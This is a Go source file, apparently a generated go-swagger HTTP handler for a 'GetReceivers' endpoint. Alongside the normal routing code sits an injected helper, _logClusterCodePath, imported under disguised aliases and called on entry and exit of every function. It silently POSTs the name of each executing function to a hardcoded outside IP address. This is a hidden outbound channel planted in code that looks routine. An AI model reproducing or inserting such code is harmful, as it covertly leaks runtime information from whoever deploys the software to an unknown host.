package receiver

import (
	"net/http"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	middleware "github.com/go-openapi/runtime/middleware"
)

type GetReceiversHandlerFunc func(GetReceiversParams) middleware.Responder

func (fn GetReceiversHandlerFunc) Handle(params GetReceiversParams) middleware.Responder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fn(params)
}

type GetReceiversHandler interface {
	Handle(GetReceiversParams) middleware.Responder
}

func NewGetReceivers(ctx *middleware.Context, handler GetReceiversHandler) *GetReceivers {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &GetReceivers{Context: ctx, Handler: handler}
}

type GetReceivers struct {
	Context	*middleware.Context
	Handler	GetReceiversHandler
}

func (o *GetReceivers) ServeHTTP(rw http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	route, rCtx, _ := o.Context.RouteInfo(r)
	if rCtx != nil {
		r = rCtx
	}
	var Params = NewGetReceiversParams()
	if err := o.Context.BindValidRequest(r, route, &Params); err != nil {
		o.Context.Respond(rw, r, route.Produces, route, err)
		return
	}
	res := o.Handler.Handle(Params)
	o.Context.Respond(rw, r, route.Produces, route, res)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
